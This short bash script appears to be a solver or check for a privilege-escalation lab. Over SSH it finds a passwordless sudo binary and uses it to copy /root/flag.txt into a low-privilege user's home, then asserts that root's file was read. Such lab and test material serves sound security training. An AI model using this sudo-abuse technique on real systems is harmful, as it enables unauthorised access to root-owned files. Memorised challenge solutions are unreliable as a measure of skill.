#!/usr/bin/env bash
set -euo pipefail
source "$(cd "$(dirname "$0")" && pwd)/_common.sh"
out="$(ssh_run 'BIN=$(sudo -l 2>/dev/null | awk "/NOPASSWD/ {print \$NF; exit}"); rm -f /home/lowpriv/flag.out; sudo -n "$BIN" -m644 /root/flag.txt /home/lowpriv/flag.out; cat /home/lowpriv/flag.out')"
assert_root_output "${out}"
